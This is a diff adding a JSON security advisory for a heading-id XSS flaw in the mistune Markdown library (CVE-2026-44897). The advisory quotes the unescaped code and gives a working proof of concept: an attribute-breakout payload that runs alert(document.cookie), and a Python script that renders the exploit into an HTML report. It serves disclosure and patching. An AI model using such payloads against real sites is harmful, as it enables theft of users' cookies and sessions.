@@ -1,0 +1,97 @@
+{
+  "id": "GHSA-v87v-83h2-53w7",
+  "modified": "2026-05-09T00:31:21.820281Z",
+  "published": "2026-05-09T00:13:12Z",
+  "aliases": [
+    "CVE-2026-44897"
+  ],
+  "summary": "Mistune Heading ID Attribute has Injection XSS",
+  "details": "## Summary\n`HTMLRenderer.heading()` builds the opening `\u003chN\u003e` tag by string-concatenating the `id` attribute value directly into the HTML — with no call to `escape()`, `safe_entity()`, or any other sanitisation function. A double-quote character `\"` in the `id` value terminates the attribute, allowing an attacker to inject arbitrary additional attributes (event handlers, `src=`, `href=`, etc.) into the heading element.\n\nThe default TOC hook assigns safe auto-incremented IDs (`toc_1`, `toc_2`, …) that never contain user text. However, the `add_toc_hook()` API accepts a caller-supplied `heading_id` callback. Deriving heading IDs from the heading text itself — to produce human-readable slug anchors like `#installation` or `#getting-started` — is by far the most common real-world usage of this callback (every major documentation generator does this). When the callback returns raw heading text, an attacker who controls heading content can break out of the `id=` attribute.\n\n## Details\n**File:** `src/mistune/renderers/html.py`\n\n```python\ndef heading(self, text: str, level: int, **attrs: Any) -\u003e str:\n    tag = \"h\" + str(level)\n    html = \"\u003c\" + tag\n    _id = attrs.get(\"id\")\n    if _id:\n        html += ' id=\"' + _id + '\"'    # ← _id is never escaped\n    return html + \"\u003e\" + text + \"\u003c/\" + tag + \"\u003e\\n\"\n```\n\nThe `text` body (line content) *is* escaped upstream by the inline token renderer, which is why `text` arrives as `\u0026quot;` etc. But `_id` arrives as a raw string directly from whatever the `heading_id` callback returned — no escaping occurs at any point in the pipeline.\n\n## PoC\n**Step 1 — Establish the baseline (safe default IDs)**\n\nThe script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom `heading_id` callback). The default hook generates sequential numeric IDs:\n\n```python\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)          # default: heading_id produces toc_1, toc_2, …\n\nbl_src = \"## Introduction\\n\"\nbl_out, _ = md_safe.parse(bl_src)\n```\n\nOutput — ID is auto-generated, no user text appears in it:\n```html\n\u003ch2 id=\"toc_1\"\u003eIntroduction\u003c/h2\u003e\n```\n\n**Step 2 — Add the realistic trigger: a text-based `heading_id` callback**\n\nDeriving an anchor ID from the heading text is the standard real-world pattern (slugifiers, `mkdocs`, `sphinx`, `jekyll` all do this). The PoC uses the simplest possible version — return the raw heading text unchanged — to show the vulnerability without any extra transformation:\n\n```python\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")   # returns raw heading text as the ID\n\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n```\n\n**Step 3 — Craft the exploit payload**\n\nConstruct a heading whose text contains a double-quote followed by an injected attribute:\n\n```\n## foo\" onmouseover=\"alert(document.cookie)\" x=\"\n```\n\nWhen `raw_id` is called, `token[\"text\"]` is `foo\" onmouseover=\"alert(document.cookie)\" x=\"`. This is passed verbatim to `heading()` as the `id` attribute value.\n\n**Step 4 — Observe attribute breakout in the output**\n\n```python\nex_src = '## foo\" onmouseover=\"alert(document.cookie)\" x=\"\\n'\nex_out, _ = md_vuln.parse(ex_src)\n```\n\nActual output:\n```html\n\u003ch2 id=\"foo\" onmouseover=\"alert(document.cookie)\" x=\"\"\u003efoo\u0026quot; onmouseover=\u0026quot;alert(document.cookie)\u0026quot; x=\u0026quot;\u003c/h2\u003e\n```\n\nNote: the heading **body text** is correctly escaped (`\u0026quot;`), but the **`id=` attribute** is not. A user who moves their mouse over the heading triggers `alert(document.cookie)`. Any JavaScript payload can be substituted.\n\n### Script \n\nA verification script was created to verify this issue. It creates a HTML page showing the bypass rendering in the browser.\n\n```python\n#!/usr/bin/env python3\n\"\"\"H2: HTMLRenderer.heading() inserts the id= value verbatim — no escaping.\"\"\"\nimport os, html as h\nfrom mistune import create_markdown\nfrom mistune.toc import add_toc_hook\n\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\n# --- baseline ---\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_file = \"baseline_h2.md\"\nbl_src  = \"## Introduction\\n\"\nwith open(os.path.join(os.getcwd(), bl_file), \"w\") as f:\n    f.write(bl_src)\nbl_out, _ = md_safe.parse(bl_src)\n\nprint(f\"[{bl_file}]\\n{bl_src}\")\nprint(\"[output — id=toc_1, no user content, safe]\")\nprint(bl_out)\n\n# --- exploit ---\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n\nex_file = \"exploit_h2.md\"\nex_src  = '## foo\" onmouseover=\"alert(document.cookie)\" x=\"\\n'\nwith open(os.path.join(os.getcwd(), ex_file), \"w\") as f:\n    f.write(ex_src)\nex_out, _ = md_vuln.parse(ex_src)\n\nprint(f\"[{ex_file}]\\n{ex_src}\")\nprint(\"[output — heading_id returns raw text, id= not escaped]\")\nprint(ex_out)\n\n# --- HTML report ---\nCSS = \"\"\"\nbody{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}\nh1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}\np.desc{color:#555;font-size:.9em;margin-top:6px}\n.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}\n.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}\n.baseline .case-header{background:#d1fae5;color:#065f46}\n.exploit  .case-header{background:#fee2e2;color:#7f1d1d}\n.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}\n.panel{padding:16px}\n.panel+.panel{border-left:1px solid #eee}\n.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}\npre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}\n.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}\n.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}\n\"\"\"\n\ndef case(kind, label, filename, src, out):\n    return f\"\"\"\n\u003cdiv class=\"case {kind}\"\u003e\n  \u003cdiv class=\"case-header\"\u003e{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}\u003c/div\u003e\n  \u003cdiv class=\"panels\"\u003e\n    \u003cdiv class=\"panel\"\u003e\n      \u003ch3\u003eInput — {h.escape(filename)}\u003c/h3\u003e\n      \u003cpre\u003e{h.escape(src)}\u003c/pre\u003e\n    \u003c/div\u003e\n    \u003cdiv class=\"panel\"\u003e\n      \u003ch3\u003eOutput — HTML source\u003c/h3\u003e\n      \u003cpre\u003e{h.escape(out)}\u003c/pre\u003e\n      \u003cdiv class=\"rlabel\"\u003e↓ rendered in browser (hover the heading to trigger onmouseover)\u003c/div\u003e\n      \u003cdiv class=\"rendered\"\u003e{out}\u003c/div\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n\u003c/div\u003e\"\"\"\n\npage = f\"\"\"\u003c!DOCTYPE html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\n\u003ctitle\u003eH2 — Heading ID XSS\u003c/title\u003e\u003cstyle\u003e{CSS}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\n\u003ch1\u003eH2 — Heading ID XSS (unescaped id= attribute)\u003c/h1\u003e\n\u003cp class=\"desc\"\u003eHTMLRenderer.heading() in renderers/html.py does html += ' id=\"' + _id + '\"' with no escaping.\nTriggered when heading_id callback returns raw heading text — the most common doc-generator pattern.\u003c/p\u003e\n{case(\"baseline\", \"Clean heading → sequential id=toc_1, safe\", bl_file, bl_src, bl_out)}\n{case(\"exploit\",  \"Malicious heading → quotes break out of id=, onmouseover injected\", ex_file, ex_src, ex_out)}\n\u003c/body\u003e\u003c/html\u003e\"\"\"\n\nout_path = os.path.join(os.getcwd(), \"report_h2.html\")\nwith open(out_path, \"w\") as f:\n    f.write(page)\nprint(f\"\\n[report] {out_path}\")\n```\n\nExample Usage:\n```bash\npython poc.py\n```\n\nOnce the script is run, open `report_h2.html` in the browser and observe the behaviour.\n\n## Impact\n| Dimension        | Assessment |\n|------------------|-----------|\n| **Confidentiality** | Session cookie / auth token theft via JavaScript execution triggered on mouse interaction |\n| **Integrity**    | DOM manipulation, phishing content injection, forced navigation |\n| **Availability** | Page freeze or crash available to attacker |\n\n**Risk context:** This vulnerability targets the most common customisation point for heading IDs. Any documentation site, wiki, or blog engine that generates slug-style anchors from heading text is vulnerable if it uses mistune's `heading_id` callback without independently sanitising the returned value.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mistune",
+        "purl": "pkg:pypi/mistune"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.4",
+        "0.4.1",
+        "0.5",
+        "0.5.1",
+        "0.6",
+        "0.7",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.8",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "2.0.0",
+        "2.0.0a1",
+        "2.0.0a2",
+        "2.0.0a3",
+        "2.0.0a4",
+        "2.0.0a5",
+        "2.0.0a6",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "3.0.0",
+        "3.0.0a1",
+        "3.0.0a2",
+        "3.0.0a3",
+        "3.0.0rc1",
+        "3.0.0rc2",
+        "3.0.0rc3",
+        "3.0.0rc4",
+        "3.0.0rc5",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1",
+        "3.1.2",
+        "3.1.3",
+        "3.1.4",
+        "3.2.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v87v-83h2-53w7/GHSA-v87v-83h2-53w7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lepture/mistune/security/advisories/GHSA-v87v-83h2-53w7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lepture/mistune"
+    }
+  ]
+}
